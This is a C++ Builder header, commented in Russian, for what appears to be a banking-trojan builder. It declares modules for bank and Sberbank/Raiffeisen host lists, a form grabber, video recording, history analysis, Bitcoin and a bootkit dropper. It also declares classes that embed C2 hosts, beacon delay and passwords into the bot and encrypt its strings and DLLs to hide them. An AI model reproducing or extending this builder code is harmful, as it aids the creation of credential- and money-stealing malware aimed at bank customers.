//---------------------------------------------------------------------------
//  Утилиты для создания сборки бота
//  Код расчитан на C++ Builder
//---------------------------------------------------------------------------

#ifndef BuilderUtilsH
#define BuilderUtilsH
//---------------------------------------------------------------------------
#include <windows.h>
#include <Classes.hpp>
#include "Strings.h"


// Версия сборщика
#define BUILDER_VERSION 1

#define BUILDER_APP_VERSION "2.3.1"



namespace Builder
{

	//-------------------------------------------------------------------
	//  PackStringsToDoubleZeroEndLine - функция упаковывает строки в
	//		одну строку. Каждая строка будет отделена нулевым символом.
	//		В конце последней строки будет стоять два нулевых символа
	//		Пустые строки будут проигнорированы.
	//
	//  Lines - Исходный набор строк
	//
	//  CryptLines - Указывает о необходимости шифровать каждую строку
	//				 перед упаковкой.
	//
	//  TrimLines - Разрешает обрезку пробелов с лева и правва строки.
	//
	//
	//  OutBuf - результирующий буфер. Память выделяется функцией MemAlloc
	//
	//  OutBufSize - Размер результирующего буфера
	//
	//  Функция возвращает истину если удалось упаковать хотя-бы одну
	//			строку
	//
	//  Примечание: В исходный набор строк Lines могут быть внесены
	//              изменения. П этому если необходимо сохранить строки
	//				в исходном состоянии передавайте их копию
	//-------------------------------------------------------------------
	bool PackStringsToDoubleZeroEndLine(TStrings *Lines,
										bool CryptLines, bool TrimLines,
										PCHAR &OutBuf, DWORD &OutBufSize);
}




PCHAR Module_BankHosts       = "Хосты режима BANKING";
PCHAR Module_Hunter          = "Hunter";
PCHAR Module_JavaConfig      = "Ссылки JAVA";
PCHAR Module_VideoRecorder   = "Запись видео";
PCHAR Module_FormGraber      = "Форм грабер";
PCHAR Module_AzConfig        = "Настройки AZ";
PCHAR Module_SberHosts       = "Хосты Sber";
PCHAR Module_RafaHosts       = "Хосты Rafa";
PCHAR Module_CCHosts         = "Хосты CC";
PCHAR Module_HistoryAnalyzer = "Анализатор истории навигации";
PCHAR Module_BootkitDroper   = "Настройки дропера буткита";
PCHAR Module_BitCoin        = "Модуль BitCoin";



// Параметры для вшития в дропер буткита
PCHAR Param_DroperNamePrefix = "__DROPER_NAME_PREFIX__";
PCHAR Param_TargetPlatform   = "__TARGET_PLATFORM__";
PCHAR Param_SVCFuckupEnabled = "__SVC_FUCKUP_ENABLED__";






class TCustomBotModule;
class TBotModule;
class TBotStringsEncryptor;



//class TOldBotBuilder;
//class TOldBotModule;
//class TOldBotParam;
class TBotModuleEdit;
class TBotStringsEncryptor;



enum TBotParamStatus {psOk, psWarning, psError};

typedef void __fastcall (__closure *TBuilderMessage)(TObject *Sender, const UnicodeString &Message);



//*****************************************************************
//  Класс базового параметров бота
//*****************************************************************
class TBotParam : public TObject
{
private:
	TCustomBotModule* FOwner;
	AnsiString FName;
	AnsiString FTitle;


	LPBYTE FData;      // Буфер данных
	bool   FEncrypted; // Признак шифрованных данных
	bool   FNotNull;   // Парметр не может быть нулевым
    bool   FEnabled;   // Признак доступности параметра
	bool   FIsDynamic; // Параметр является динамичиским. Не может быть включен/отключен
	bool   FIsSessional; // Параметр одной сессии т.е. создаётся во время открытия файла
	DWORD  FDataSize;   // Размер записанных данных

	friend class TCustomBotModule;

	void Clear();
	void ResetStatus();

	bool GetActive();
	bool GetIsDynamic();


	AnsiString GetAsMultiLine();
	void	   SetAsMultiLine(const AnsiString& Value);
	DWORD      GetAsLong();
	void       SetAsLong(DWORD Value);
	bool       GetAsBool();
	void       SetAsBool(bool Value);
protected:
	int   FPosition;   // Позиция параметра ф буфере
	DWORD FSize;       // Разммер буфера

	void SetValue(LPVOID Data, DWORD Size, bool Encrypt);

	AnsiString virtual GetAsString();
	void       virtual SetAsString(const AnsiString& Value);

    bool virtual UpdateStatus(LPBYTE Buf, DWORD BufSize);

	bool virtual Write(LPBYTE Buf, DWORD BufSize);

	void virtual DoSaveToStream(TStream *Stream, LPBYTE Buf, DWORD Size);
	void virtual DoLoadFromStream(TStream *Stream, LPBYTE &Buf, DWORD &Size);
public:
	TBotParam(TCustomBotModule* AOwner, PCHAR Name, DWORD Size, bool Encrypted, bool NotNull, PCHAR Title);
	__fastcall ~TBotParam();

    TBotParamStatus ValueStatus();
	bool virtual CheckParam(LPBYTE Buf, LPBYTE OriginalBuf);

	void virtual SaveToStream(TStream *Stream);
	void virtual LoadFromStream(TStream *Stream);

	__property bool       Active = {read=GetActive};
	__property bool       Enabled = {read=FEnabled, write=FEnabled};
	__property bool       IsDynamic = {read=FIsDynamic, write=FIsDynamic};
	__property bool       IsSessional = {read=FIsSessional, write=FIsSessional};
	__property AnsiString Name = {read=FName};
	__property AnsiString Title = {read=FTitle};
	__property DWORD      Size = {read=FSize};
	__property bool       Encrypted = {read=FEncrypted};
	__property AnsiString AsString    = {read=GetAsString, write=SetAsString};
	__property AnsiString AsMultiLine = {read=GetAsMultiLine, write=SetAsMultiLine};
	__property DWORD      AsLong = {read=GetAsLong, write=SetAsLong};
	__property bool       AsBool = {read=GetAsBool, write=SetAsBool};
    __property int        Position = {read=FPosition};
};



//*****************************************************************
//  Класс основного пароля бота
//*****************************************************************
class TMainPassword : public TBotParam
{
private:
	typedef TBotParam inherited;

    AnsiString FPassword;
protected:
	AnsiString GetAsString();
	void       SetAsString(const AnsiString& Value);
	void DoSaveToStream(TStream *Stream, LPBYTE Buf, DWORD Size);
	void DoLoadFromStream(TStream *Stream, LPBYTE &Buf, DWORD &Size);

public:
	TMainPassword(TCustomBotModule* AOwner, PCHAR Name, DWORD Size, bool Encrypted, bool NotNull, PCHAR Title);
	__fastcall ~TMainPassword();
};



//*****************************************************************
//  Класс базового модуля параметров бота
//*****************************************************************
class TCustomBotModule : public TComponent
{
private:
	TList* FItems;
    bool FWriteDisabledParams;

	friend class TBotParam;

	int  GetCount();
	bool GetActive();

	TBotParam* GetItems(int Index);

protected:
	void virtual InsertItem(TBotParam* Param);
	void virtual RemoveItem(TBotParam* Param);
	void virtual Clear();
	void         ClearSessionParams();

	void ResetParamsStatus();
	bool UpdateParamsStatus(const char* FileName);
	bool WriteParams(LPBYTE Buf, DWORD BufSize);
public:
	__fastcall TCustomBotModule(TComponent* AOwner);
	__fastcall ~TCustomBotModule();

	TBotParam* GetParamForPos(int Position);
	void ClearValues();
	TBotParamStatus CheckParamsValue(TStrings* Errors, bool FullBuild);

	TBotParam* ParamByName(const AnsiString &Name);

	__property bool Active = {read=GetActive};
	__property int  Count = {read=GetCount};
	__property bool WriteDisabledParams = {read=FWriteDisabledParams, write=FWriteDisabledParams};
	__property TBotParam* Items[int Index] = {read=GetItems};
};





//*****************************************************************
//  Модуль базовых настроек бота
//*****************************************************************
class TBaseBotModule : public TCustomBotModule
{
private:
	// Базовые параметры сборки
	TBotParam* FPrefix;
	TBotParam* FHosts;
	TBotParam* FDelay;
	TBotParam* FPassword;

	UnicodeString FFileName;
	TBuilderMessage FOnMessage;

	UnicodeString GetResultFileName();
protected:
    void virtual DoBeforeBuild(LPBYTE Buf, DWORD BufSize) {};
public:
	__fastcall TBaseBotModule(TComponent* AOwner);
	__fastcall ~TBaseBotModule();

	bool Open(const UnicodeString &FileName);
	bool Close();

	bool virtual Build(bool FullBuild);


	__property UnicodeString FileName = {read=FFileName};
	__property UnicodeString ResultFileName = {read=GetResultFileName};

	__property TBotParam* Prefix   = {read=FPrefix};
	__property TBotParam* Hosts    = {read=FHosts};
	__property TBotParam* Delay    = {read=FDelay};
	__property TBotParam* Password = {read=FPassword};

	__property TBuilderMessage OnMessage  = {read=FOnMessage, write=FOnMessage};
};



//*****************************************************************
//  Модуль дополнительных настроек бота
//*****************************************************************
class TBotBuilder : public TBaseBotModule
{
private:
	typedef TBaseBotModule inherited;

	TList* FModules;

	TBotParam*            FSessionPassword; // Пароль шифрования строк
	TBotStringsEncryptor* FSringsEncryptor; // Класс шифрования строк
    bool FEncryptDlls;


	friend class TBotModule;
	int GetModulesCount();
	TBotModule* GetModules(int Index);

	bool GetEncryptStrings();
	void SetEncryptStrings(bool Value);

	void InitializeDLLsEncryptors(LPBYTE Buf, DWORD BufSize);
protected:
	void virtual DoBeforeBuild(LPBYTE Buf, DWORD BufSize);
public:
	__fastcall TBotBuilder(TComponent *AOwner);
	__fastcall ~TBotBuilder();

	void SaveToStream(TStream *Stream);
	void LoadFromStream(TStream *Stream);
	void SaveToFile(const UnicodeString &FileName);
	void LoadFromFile(const UnicodeString &FileName);

    bool virtual Build(bool FullBuild);

	void SetModuleEdit(const UnicodeString &Name, TBotModuleEdit* Edit);
	TBotModule* ModuleByName(const UnicodeString &Name);

	__property int ModulesCount = {read=GetModulesCount};
	__property TBotModule* Modules[int Index]  = {read=GetModules};
	__property bool EncryptStrings = {read=GetEncryptStrings, write=SetEncryptStrings};
	__property bool EncryptDlls = {read=FEncryptDlls, write=FEncryptDlls};
};



//*****************************************************************
//  Модуль дополнительных настроек бота
//*****************************************************************
class TBotModule : public TCustomBotModule
{
private:
	TBotBuilder *FBuilder;
	UnicodeString FModuleName;
	TBotModuleEdit* FEdit;

	friend class TBotBuilder;

	typedef TCustomBotModule inherited;
protected:
	void virtual InsertItem(TBotParam* Param);
	void virtual RemoveItem(TBotParam* Param);
	void virtual Clear();
public:
	__fastcall TBotModule(TBotBuilder *ABuilder, const UnicodeString &Name);
	__fastcall ~TBotModule();

	bool CanEdit();
	bool Edit();

	__property UnicodeString ModuleName = {read=FModuleName};
};


//*************************************************************
//  TCustomBotDataEncryptor  - Базовый Класс шифрования
//							   данных бота
//*************************************************************
class TCustomBotDataEncryptor : public TBotParam
{
private:
	TBotParam* FPassord;
public:
	TCustomBotDataEncryptor(TCustomBotModule* AOwner, PCHAR Name, DWORD Size);

	void SaveToStream(TStream *Stream) {};
	void LoadFromStream(TStream *Stream) {};

	__property TBotParam* Password = {read=FPassord, write=FPassord};
};


//*************************************************************
//   TBotStringsEncryptor  - Класс шифрования строк бота
//*************************************************************
class TBotStringsEncryptor : public TCustomBotDataEncryptor
{
private:
	DWORD FEndAnchorPos;
protected:
	bool UpdateStatus(LPBYTE Buf, DWORD BufSize);
	bool Write(LPBYTE Buf, DWORD BufSize);
public:
	__fastcall TBotStringsEncryptor(TCustomBotModule* AOwner);

};


//*************************************************************
//   TBotDLLEncryptor  - Класс шифрования интегрированных
//                       DLL бота
//*************************************************************
class TBotDLLEncryptor : public TCustomBotDataEncryptor
{
private:
	DWORD  FDllSize;
	string FPassword;
	DWORD  FHash;
	friend class TBotBuilder;
protected:
	bool Write(LPBYTE Buf, DWORD BufSize);
public:
	TBotDLLEncryptor(TCustomBotModule* AOwner, int APosition, DWORD ASize);

    bool CheckParam(LPBYTE Buf, LPBYTE OriginalBuf);
};


//*************************************************************
//  TOldBotBuilder - Класс, сборщик бота
//*************************************************************
//class TOldBotBuilder : public TComponent
//{
//private:
//	UnicodeString FSourceFileName;
//	UnicodeString FResultFileName;
//	bool FResultFileNameChanged;
//	TCollection* FParams;
//	TCollection* FModules;
//	TList*       FActiveModules;
//	TMemoryStream* FFile;   // Загруженный файл
//	TOldBotParam* FPrefix;     // Префикс бота
//	TOldBotParam* FPassword;   // Пароль бота
//	TOldBotParam* FDelay;      // Период отстука
//	TOldBotParam* FHosts;      // Основные хосты
//	TBotStringsEncryptor *FStringsEncryptor; // Объяект шифрования строк бота
//	TBuilderMessage FOnMessage;
//	friend class TOldBotModule;
//	friend class TOldBotParam;
//	void __fastcall WriteParametr(PCHAR Buf, DWORD BufSize, TOldBotParam* Param);
//	void __fastcall EncryptDllData(PCHAR Buf, DWORD BufSize, PCHAR Passw);
//protected:
//	void __fastcall virtual ParamValueChanged(TOldBotParam* Sender);
//	void __fastcall Message(const UnicodeString &Message);
//	void __fastcall Message(TStrings *Messages);
//    void __fastcall InitializeModules();
//public:
//	__fastcall TOldBotBuilder(TComponent* AOwner);
//	__fastcall ~TOldBotBuilder();
//
//    TOldBotModule*     __fastcall AddModule(const char *Name);
//	void            __fastcall LoadSourceFile(const UnicodeString &FileName);
//	bool            __fastcall Build(bool FullBuild);
//	void            __fastcall ClearParams();
//
//
//	__property UnicodeString SourceFileName = {read=FSourceFileName};
//	__property UnicodeString ResultFileName = {read=FResultFileName};
//
//	// События
//    __property TBuilderMessage OnMessage  = {read=FOnMessage, write=FOnMessage};
//};


//*************************************************************
//  TOldBotModule - Класс настроек отдельного модуля
//*************************************************************
//class TOldBotParam : public TCollectionItem
//{
//private:
//	TOldBotBuilder* FOwner;
//	TOldBotModule*  FModule;
//	AnsiString FName;
//	bool  FEnabled;
//	bool  FNotNull;   // Обязательный параметр
//	bool  FEncrypted; // Параметр должен быть шифрованным
//	DWORD FSize;      // Размер буфера параметра
//	PCHAR FData;      // Данные
//	DWORD FDataSize;  // Размер данных
//	UnicodeString FTitle;
//	void __fastcall Changed();
//	AnsiString __fastcall GetAsAnsiString();
//	void __fastcall SetAsAnsiString(const AnsiString &Value);
//	UnicodeString __fastcall GetAsUnicodeString();
//	void __fastcall SetAsUnicodeString(const UnicodeString &Value);
//	UnicodeString __fastcall GetAsStrings();
//	void __fastcall SetAsStrings(const UnicodeString &Value);
//	bool __fastcall GetActive();
//
//	friend class TOldBotBuilder;
//	friend class TOldBotModule;
//protected:
//	UnicodeString __fastcall GetDisplayName(void);
//	void __fastcall SetSize(DWORD Value);
//	void __fastcall virtual DoChanged();
//	bool __fastcall virtual Write(PCHAR Buf, DWORD BufSize);
//    bool __fastcall virtual WriteEmptyData(PCHAR Buf, DWORD BufSize);
//	bool __fastcall DoWrite(PCHAR Buf, DWORD BufSize, PCHAR AData, DWORD ADataSize);
//	__property PCHAR Data = {read = FData};
//public:
//	__fastcall TOldBotParam(TOldBotBuilder* AOwner, bool NotNull, bool Encrypted, const char* Name, DWORD Size, const char* Title);
//	__fastcall ~TOldBotParam();
//
//	bool __fastcall IsEmpty();
//	void __fastcall Clear();
//	void __fastcall SetValue(PCHAR Value, DWORD ValueSize);
//    int  __fastcall Position(PCHAR Buf, DWORD BufSize);
//	TBotParamStatus __fastcall virtual Status();
//
//
//	void __fastcall SaveToStrings(TStrings *Strings);
//	void __fastcall LoadFromStrings(TStrings *Strings);
//
//	__property bool Enabled = {read = FEnabled, write = FEnabled};
//	__property bool Active  = {read=GetActive};
//	__property TOldBotModule*  Module = {read=FModule};
//	__property DWORD Size = {read=FSize};
//	__property bool Encrypted = {read = FEncrypted};
//	__property UnicodeString Title = {read = FTitle, write = FTitle};
//	__property UnicodeString AsStrings = {read = GetAsStrings, write = SetAsStrings};
//	__property AnsiString    AsAnsiString = {read = GetAsAnsiString, write = SetAsAnsiString};
//	__property UnicodeString AsUnicodeString = {read = GetAsUnicodeString, write = SetAsUnicodeString};
//
//
//};




//*************************************************************
//  TOldBotModule - Класс настроек отдельного модуля
//*************************************************************
//class TOldBotModule : public TCollectionItem
//{
//private:
//	TOldBotBuilder* FBuilder;
//	UnicodeString FName;
//	TList *FParams;
//	TBotModuleEdit* FEdit;
//	bool FActive;
//	friend class TOldBotBuilder;
//	friend class TOldBotParam;
//	int __fastcall GetParamsCount();
//	TOldBotParam* __fastcall GetParams(int Index);
//	bool __fastcall Activate(PCHAR Buf, DWORD BufSize);
//public:
//	__fastcall TOldBotModule(TOldBotBuilder* AOwner, const char *Name);
//	__fastcall ~TOldBotModule();
//
//	TOldBotParam* __fastcall AddParam(bool NotNull, bool Encrypted, const char* Name, DWORD Size, const char* Title);
//
//    TOldBotParam* __fastcall ParamByName(const AnsiString &Name);
//	bool __fastcall CanEdit();
//    bool __fastcall Edit();
//
//	__property bool Active = {read=FActive};
//	__property TOldBotBuilder* Builder = {read = FBuilder};
//	__property UnicodeString Name = {read=FName};
//	__property int ParamsCount = {read=GetParamsCount};
//	__property TOldBotParam* Params[int Index] = {read=GetParams};
//};



//*************************************************************
//   TBotModuleEdit  - Класс редактор модуля
//*************************************************************
class TBotModuleEdit
{
public:
	bool __fastcall virtual Execute(TBotModule *Module) = 0;
};



//*************************************************************
//   TBuildChecker  - Класс проверки результата сборки
//*************************************************************
class TBuildChecker : public TComponent
{
private:
	UnicodeString FSourceFile;
	UnicodeString FResultFile;
	LPBYTE FSourceBuf;
	LPBYTE FResultBuf;
	DWORD FSourceSize;
	DWORD FResultSize;
	TBaseBotModule* FModule;
public:
	__fastcall  TBuildChecker(TComponent* AOwner, TBaseBotModule* AModule);
	__fastcall  ~TBuildChecker();

	bool OpenFiles(const UnicodeString& SourceFile, const UnicodeString& ResultFile);
	bool CompareBuffers(LPBYTE Source, DWORD SourceSize, LPBYTE Result, DWORD ResultSize);

	bool Check();
};



//---------------------------------------------------------------------------
#endif
